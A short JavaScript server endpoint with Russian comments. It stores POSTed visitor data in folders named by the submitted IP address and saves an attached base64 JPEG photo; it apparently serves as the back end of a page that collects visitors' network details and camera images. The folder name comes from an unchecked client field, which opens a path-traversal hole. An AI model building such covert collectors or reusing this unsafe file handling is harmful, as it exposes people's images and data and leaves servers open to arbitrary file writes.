import fs from 'fs';
import path from 'path';

export default async (req, res) => {
  if (req.method === 'POST') {
    const data = req.body;
    const userDir = path.join(process.cwd(), 'user_data', data.networkInfo.ip);
    
    // Создаем папку пользователя
    if (!fs.existsSync(userDir)) {
      fs.mkdirSync(userDir, { recursive: true });
    }
    
    // Сохраняем данные
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    const fileName = `data-${timestamp}.json`;
    
    fs.writeFileSync(
      path.join(userDir, fileName),
      JSON.stringify(data, null, 2)
    );
    
    // Сохраняем фото отдельно
    if (data.photo) {
      const base64Data = data.photo.replace(/^data:image\/jpeg;base64,/, "");
      fs.writeFileSync(
        path.join(userDir, `photo-${timestamp}.jpg`), 
        base64Data, 'base64'
      );
    }
    
    res.status(200).json({ status: 'success' });
  } else {
    res.status(405).end();
  }
};